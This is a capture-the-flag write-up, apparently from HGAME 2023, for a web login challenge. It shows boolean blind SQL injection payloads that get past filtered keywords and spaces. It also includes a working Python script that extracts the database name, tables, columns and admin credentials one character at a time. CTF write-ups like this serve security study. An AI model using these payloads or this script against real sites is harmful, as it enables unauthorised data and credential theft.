![](<./img/Pasted image 20230208181804.png>)

```
/login
```

```
Username: testuser
Password: testpassword
```

![](<./img/Pasted image 20230208182845.png>)

```
/index
```

![](<./img/Pasted image 20230208183026.png>)

```
Username: 1'or/**/1#
Password: 
```

```
Success!
```

```
Username: 1'or/**/0^1#
Password: 
```

```
Failed!
```

存在布尔盲注

经过测试，过滤掉了这些东西

```
<space>
=
union
substr
and
mid
```

可以利用`left`和`right`函数的组合实现字符串的截取

```python
from requests import post
from sys import stdout

url = 'http://week-3.hgame.lwsec.cn:30056/login'
data = {'username': '', 'password': ''}

username = "1'or/**/{}>{}#"
password = ''

nth_ascii = 'ascii(right(left({},{}),1))'

success = lambda response: 'Success' in response.text

index = 0
while True:
    index += 1
    left = 0
    right = 127
    while left < right:
        mid = (left + right) // 2
        payload = data.copy()
        payload['username'] = username.format(
            nth_ascii.format('database()', index), mid
        )
        if success(post(url, payload)): # mid < nth_char
            left = mid + 1
        else:
            right = mid
    print(chr(left), end='')
    stdout.flush()
```

```
L0g1NMeeeee...
```

```python
payload['username'] = username.format(
	nth_ascii.format('(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(database()))', index), mid
)
```

```
User1nf0mAt1onnnnn...
```

```python
payload['username'] = username.format(
    nth_ascii.format("(select(group_concat(column_name))from(information_schema.columns)where(table_name)in('User1nf0mAt1on'))", index), mid
)
```

```
id,PAssw0rD,UsErN4meeeee...
```

```python
payload['username'] = username.format(
    nth_ascii.format("(select(group_concat(UsErN4me))from(User1nf0mAt1on))", index), mid
)
```

```
hgAmE2023HAppYnEwyEAr,testuserrrrr...
```

2023 happy new year~

```python
payload['username'] = username.format(
    nth_ascii.format("(select(group_concat(PAssw0rD))from(User1nf0mAt1on))", index), mid
)
```

```
WeLc0meT0hgAmE2023hAPPySql,testpassworddddd...
```

```
Username: hgAmE2023HAppYnEwyEAr
Password: WeLc0meT0hgAmE2023hAPPySql
```

```
Hello admin!
```

```
/home
```

![](<./img/Pasted image 20230208205128.png>)

#Web #SQL注入 #布尔盲注 #绕过 